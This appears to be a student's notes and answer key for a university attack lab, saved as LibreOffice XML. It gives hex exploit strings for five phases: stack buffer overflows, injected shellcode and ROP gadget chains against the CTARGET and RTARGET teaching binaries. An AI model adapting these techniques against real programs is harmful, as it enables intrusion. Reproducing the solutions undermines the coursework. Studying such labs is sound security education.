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icrosoft Yahei1" svg:font-family="'Microsoft Yahei'" style:font-family-generic="system" style:font-pitch="variable"/>
  </office:font-face-decls>
  <office:automatic-styles>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum8">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:line-height="100%"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9">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text-properties fo:color="#24292e" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum2">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false"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text-indent="-0.25in" style:auto-text-indent="false" fo:padding="0in" fo:border="none"/>
    </style:style>
    <style:style style:name="P15"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6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:line-height="100%" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum1">
      <style:paragraph-properties fo:margin-left="1in" fo:margin-right="0in" fo:text-indent="-0.25in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum3">
      <style:paragraph-properties fo:margin-left="1in" fo:margin-right="0in" fo:text-indent="-0.25in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WWNum3">
      <style:paragraph-properties fo:margin-left="1.5in" fo:margin-right="0in" fo:text-indent="-0.25in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="Standard">
      <style:paragraph-properties fo:line-height="100%" style:page-number="1"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#24292e" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#413f3f"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#dd1144" fo:background-color="#eeeeee" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="11pt" style:font-name-asian="Arial1" style:font-size-asian="11pt" style:font-name-complex="Arial1" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T1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Things to know:<text:tab/><text:tab/><text:tab/><text:tab/></text:span></text:p>
      <text:list xml:id="list4018833222" text:style-name="WWNum8">
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">“Overrunning the buffer typically causes the program state to be corrupted, leading to a memory access error. Your task is to be more clever with the strings you feed CTARGET and RTARGET so that they do more interesting things. These are called exploit strings.”</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P16"><text:span text:style-name="T2"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span></text:p>
      <text:list xml:id="list191229597400510" text:continue-numbering="true" text:style-name="WWNum8">
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">if you want to create a byte with a hex value of 0, you need to write it as 00 </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">Put your answer backward so like 401020 <text:s/>-&gt; 20 10 40</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">Pre allocating memory, subtract rsp</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">Assigning value to rsp, adds to rsp</text:span><text:span text:style-name="T1"><text:tab/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P2"><text:span text:style-name="T2">Code Injection vs Return oriented programming<text:tab/></text:span><text:span text:style-name="T1"><text:tab/></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Phase 1:</text:span></text:p>
      <text:list xml:id="list1190931464" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P3">Figuring out How big the buffer by looking at </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3">get buff</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P17">sub <text:s text:c="3"/>$0x38,%rsp , 0x38 = 56 </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3">Overflow the buffer and rewrite the return address by redirecting it to the address of touch1</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>00 00 00 00 00 00 <text:s/>//56 <text:s/>zero/padding</text:p>
      <text:p text:style-name="Standard">9c 12 40 00 00 00 00 00 //address of touch1</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Phase 2:</text:span></text:p>
      <text:list xml:id="list1244634576" text:style-name="WWNum3">
        <text:list-item>
          <text:p text:style-name="P4">Look at the stack(it’ll help you understand)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">(Look at hints in the handout) store your cookie into rdi so you can pass it as an argument</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P18">mov <text:s text:c="3"/>$0x14f987af,%rdi</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">Than you are going to want to push the address of touch2 and have a return(in a .d file)</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P18">pushq <text:s/>$0x4012c8</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P18">retq </text:p>
              <text:list>
                <text:list-item>
                  <text:p text:style-name="P19">You’ll get the <text:span text:style-name="T3">byte representation of the assembly code and that’s what you’ll use in your answer.</text:span></text:p>
                </text:list-item>
              </text:list>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">If you run getbuff(hence set a breakpoint at getbuf to see what’s happening) and run it with your answer and check what’s in your stack (do x/20x $rsp ) you’ll see that your cookie and push touch2 at first are just passed in as a string so at first it doesn’t matter that much. But then when you get to rsp</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">The rsp address is at the top of the stack where your instructions are hence they’ll start being implemented, where you pass the cookie as an argument to touch2.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard">48 c7 c7 af 87 f9 14 68 //cookie</text:p>
      <text:p text:style-name="Standard">c8 12 40 00 c3 00 00 00 //push touch2</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 0//0 00</text:p>
      <text:p text:style-name="Standard">78 9c 63 55 00 00 00 00 //rsp hex after callq //address of first machine instruction</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>//overwrite with our first injected code</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Phase 3:</text:span></text:p>
      <text:list xml:id="list2522016704" text:style-name="WWNum2">
        <text:list-item>
          <text:p text:style-name="P5">Convert cookie into a string</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:s/>If it is stored in buf, then the next hexmatch may overwrite its stack, but the parent stack of buf is safe. We put the address of touch3 on the top of the parent stack. <text:tab/></text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list2495714483" text:style-name="WWNum4">
        <text:list-item>
          <text:p text:style-name="P10">Your injected code should set register %rdi to the address of this string. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">“When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.” </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">Rsp from phase 2 is the first thing we read which sends us to our instruction and there it grabs the cookie.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">48 c7 c7 b8 9c 63 55 68 <text:s/>// <text:s/>the return address should be rsp from phase 2 +0x40(64 decimal) into rdi is where the address of the string (the location where the code execution address is saved) //moving the cookie to rdi(this is where the cookie was stored previously, past the overflow point at the end of the buffer) plus buffer size+0x8 for the return address and another 0x8 for touch 3</text:p>
      <text:p text:style-name="Standard">d9 13 40 00 c3 00 00 00 //address of touch3</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">78 9c 63 55 00 00 00 00 //rsp from phase 2//points back to the beginning where your instructions are</text:p>
      <text:p text:style-name="Standard">31 34 66 39 38 37 61 66 // cookie turn into a string</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Phase 4:</text:span></text:p>
      <text:list xml:id="list3063310470" text:style-name="WWNum9">
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">the strategy is to find several instructions/byte sequence in the existing code, these instructions are followed by instructions</text:span> ret(gadgets)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">Each return is equivalent to jumping from one gadget to another, and then doing so through the constant jump to complete the operation we want. </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">Similar logic as phase 2 but we are using return-oriented programming</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">Your first gadget will be a popq rax(58),</text:span><text:span text:style-name="T6">it will pop data from the stack</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">Then put your cookie address and store it in rax thanks to gadget 1, then put the cookie into edi (hence mov rax,edi is your second gadget(48 89 c7 c3))</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="T4">And then just past the address of touch2</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 00 00</text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">7e 14 40 00 00 00 00 00 //gadget 1 popq rax <text:s/>whatever was put at the top of the stack put into rax,//overwriting the return address with a gadget(that’s how it jumps into the stack)</text:p>
      <text:p text:style-name="Standard">When it gets a return command it looks at the return address and then it moves the stack pointer down .A return address is like popping. The gadget includes a return and then goes down to the cookie(rsp goes down to the cookie)</text:p>
      <text:p text:style-name="Standard">af 87 f9 14 00 00 00 00 //cookie Address , put cookie where rax is (stored in rax)</text:p>
      <text:p text:style-name="Standard">a6 14 40 00 00 00 00 00 //gadget 2 mov rax,edi // there is a c3 at that address</text:p>
      <text:p text:style-name="Standard">c8 12 40 00 00 00 00 00 //touch2</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Phase 5:</text:span></text:p>
      <text:list xml:id="list16701639" text:style-name="WWNum7">
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T3">From the moment we move the address of rsp to rax till the address of cookie, there are 9 addresses which are 8 gadgets and the address of touch3, exclude the value read in to rax and each address has 8 bytes.The gap must be 72 bytes, which is equal to the address of 0x48.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T3">The solution for this is to use ROP (Return Oriented Programming), what ROP does is that since we can't execute our own code, we will look for instructions in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit.<text:tab/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">00 00 00 00 00 00 00 00 </text:p>
      <text:p text:style-name="Standard">da 14 40 00 00 00 00 00 //Mov %rsp, %rax</text:p>
      <text:p text:style-name="Standard">a6 14 40 00 00 00 00 00//Mov %rax, %rdi</text:p>
      <text:p text:style-name="Standard">99 14 40 00 00 00 00 00 //pop rax //pop data from the stack</text:p>
      <text:p text:style-name="Standard">48 00 00 00 00 00 00 00 <text:s/>// 9*8 = 72 =0x48 //6*8 <text:s/>to set up eax into esi</text:p>
      <text:p text:style-name="Standard">02 15 40 00 00 00 00 00//Movl %eax, %ecx <text:s text:c="2"/>//89 c1</text:p>
      <text:p text:style-name="Standard">4b 15 40 00 00 00 00 00//Movl %ecx, %edx //89 ca</text:p>
      <text:p text:style-name="Standard">1d 15 40 00 00 00 00 00 //Movl %edx, %esi <text:s/>//89 d6</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>b1 14 40 00 00 00 00 00//Lea (%rdi, %rsi, 1), %rax putting cookie into rax</text:p>
      <text:p text:style-name="Standard">a6 14 40 00 00 00 00 00//Mov %rax, %rdi</text:p>
      <text:p text:style-name="Standard">d9 13 40 00 00 00 00 00//Touch3's address</text:p>
      <text:p text:style-name="Standard">31 34 66 39 38 37 61 66//Cookie string</text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:list xml:id="list675623003" text:style-name="WWNum5">
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T7">The first thing to do is to get the current </text:span><text:span text:style-name="T8">%rsp</text:span><text:span text:style-name="T7">address and use it to find the string.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T7">Add this address to the offset, here is the function </text:span><text:span text:style-name="T8">0x48 </text:span><text:span text:style-name="T7">just used</text:span><text:span text:style-name="T8">add_xy</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T7">Find a way to put the above value into the </text:span><text:span text:style-name="T8">%rdi</text:span><text:span text:style-name="T7">middle</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T7">Follow the previous </text:span><text:span text:style-name="T8">ret </text:span><text:span text:style-name="T7">instruction, return </text:span><text:span text:style-name="T8">touch3 </text:span><text:span text:style-name="T7">the address</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T7">Store the string, for the sake of convenience, we put it to the end</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Return Oriented programming:</text:p>
      <text:p text:style-name="Standard"><text:tab/><text:tab/> <text:tab/> <text:tab/> <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard">Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET, because it uses two techniques to thwart such attacks:<text:tab/></text:p>
      <text:list xml:id="list2409637218" text:style-name="WWNum6">
        <text:list-item>
          <text:p text:style-name="P15">It uses<text:span text:style-name="T5"> randomization </text:span>so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/> <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Fortunately, clever people have devised strategies for getting useful things done in a program by <text:span text:style-name="T11">executing existing code</text:span>, rather than injecting new code. The most general form of this is referred to as <text:span text:style-name="T2">return-oriented programming </text:span>(ROP) [1, 2]. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret. Such a segment is referred to as a <text:span text:style-name="T2">gadget</text:span>. Figure 2 illustrates how the stack can be set up to execute a sequence of n gadgets. In this figure, the stack contains a sequence of gadget addresses. Each gadget consists of a series of instruction bytes, with the final one being 0xc3, encoding the ret instruction. When the program executes a ret instruction starting with this configuration, it will initiate a chain of gadget executions, with the ret instruction at the end of each gadget causing the program to jump to the beginning of the next.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">A gadget can make use of code corresponding to assembly-language statements generated by the compiler, especially ones at the ends of functions. In practice, there may be some useful gadgets of this form, but not enough to implement many important operations. For example, it is highly unlikely that a compiled function would have popq %rdi as its last instruction before ret. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard"><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/><text:tab/><text:tab/></text:p>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icrosoft Yahei1"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13f3f" style:font-name="Arial" fo:font-family="Arial" style:font-family-generic="roman" style:font-pitch="variable" fo:font-size="11pt" style:text-underline-style="none" style:font-name-asian="Microsoft Yahei1" style:font-family-asian="'Microsoft Yahei'" style:font-family-generic-asian="system" style:font-pitch-asian="variable" style:font-size-asian="12pt" style:font-name-complex="Microsoft Yahei1" style:font-family-complex="'Microsoft Yahei'"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Microsoft Yahei"/>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2" meta:word-count="1760" meta:character-count="8595" meta:non-whitespace-character-count="6876"/>
    <meta:generator>LibreOfficeDev/6.0.5.2$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>